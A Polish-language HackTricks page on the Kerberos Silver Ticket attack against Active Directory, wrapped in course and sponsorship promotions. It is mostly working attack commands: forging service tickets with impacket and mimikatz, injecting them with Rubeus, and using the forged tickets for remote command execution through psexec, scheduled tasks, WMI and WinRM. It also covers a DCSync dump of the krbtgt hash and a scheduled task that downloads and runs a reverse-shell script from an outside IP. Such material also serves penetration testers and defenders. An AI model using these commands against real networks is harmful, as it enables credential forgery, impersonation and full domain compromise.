# Bilet srebrny

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Jeśli interesuje Cię **kariera hakerska** i hakowanie niemożliwych do zhakowania rzeczy - **zatrudniamy!** (_wymagane biegłe posługiwanie się językiem polskim w mowie i piśmie_).

{% embed url="https://www.stmcyber.com/careers" %}

## Bilet srebrny

Atak **Bilet srebrny** polega na wykorzystaniu biletów usługi w środowiskach Active Directory (AD). Ta metoda polega na **uzyskaniu skrótu NTLM konta usługi**, takiego jak konto komputera, w celu sfałszowania biletu usługi Ticket Granting Service (TGS). Dzięki temu sfałszowanemu biletowi, atakujący może uzyskać dostęp do określonych usług w sieci, **udając dowolnego użytkownika**, zwykle dążąc do uzyskania uprawnień administracyjnych. Podkreśla się, że korzystanie z kluczy AES do fałszowania biletów jest bardziej bezpieczne i mniej wykrywalne.

Do tworzenia biletów używane są różne narzędzia, w zależności od systemu operacyjnego:

### W systemie Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Na systemie Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Usługa CIFS jest wyróżniona jako powszechny cel ataku w celu uzyskania dostępu do systemu plików ofiary, ale inne usługi, takie jak HOST i RPCSS, mogą również być wykorzystane do zadań i zapytań WMI.

## Dostępne usługi

| Rodzaj usługi                              | Bilety srebrne dla usługi                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>W zależności od systemu operacyjnego również:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>W niektórych przypadkach można po prostu poprosić o: WINRM</p> |
| Zaplanowane zadania                         | HOST                                                                       |
| Udostępnianie plików systemu Windows, również psexec            | CIFS                                                                       |
| Operacje LDAP, w tym DCSync           | LDAP                                                                       |
| Narzędzia zdalnego zarządzania serwerem Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Bilety złote                             | krbtgt                                                                     |

Za pomocą **Rubeus** możesz **poprosić o wszystkie** te bilety, używając parametru:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### ID zdarzeń dla biletów srebrnych

* 4624: Logowanie konta
* 4634: Wylogowanie konta
* 4672: Logowanie administratora

## Nadużywanie biletów usług

W poniższych przykładach załóżmy, że bilet jest pobierany przez podszywanie się pod konto administratora.

### CIFS

Z tym biletem będziesz mógł uzyskać dostęp do folderów `C$` i `ADMIN$` za pomocą protokołu **SMB** (jeśli są one wystawione) i skopiować pliki do części zdalnego systemu plików, wykonując coś w stylu:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Będziesz również w stanie uzyskać powłokę wewnątrz hosta lub wykonywać dowolne polecenia za pomocą **psexec**:

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### HOST

Z tym uprawnieniem możesz generować zaplanowane zadania na zdalnych komputerach i wykonywać dowolne polecenia:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Z tymi biletami możesz **wykonywać WMI w systemie ofiary**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Znajdź **więcej informacji na temat wmiexec** na następnej stronie:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Z dostępem do winrm na komputerze możesz **uzyskać do niego dostęp** i nawet uruchomić PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Sprawdź następującą stronę, aby dowiedzieć się **więcej sposobów na połączenie z zdalnym hostem za pomocą winrm**:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Zauważ, że **winrm musi być aktywny i nasłuchiwać** na zdalnym komputerze, aby uzyskać do niego dostęp.
{% endhint %}

### LDAP

Z tym uprawnieniem możesz wydobyć bazę danych DC za pomocą **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Dowiedz się więcej o DCSync** na następnej stronie:

## Referencje
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Jeśli interesuje Cię **kariera hakera** i hakowanie niemożliwych do zhakowania rzeczy - **zatrudniamy!** (_wymagane biegłe posługiwanie się językiem polskim w mowie i piśmie_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów na GitHubie.**

</details>
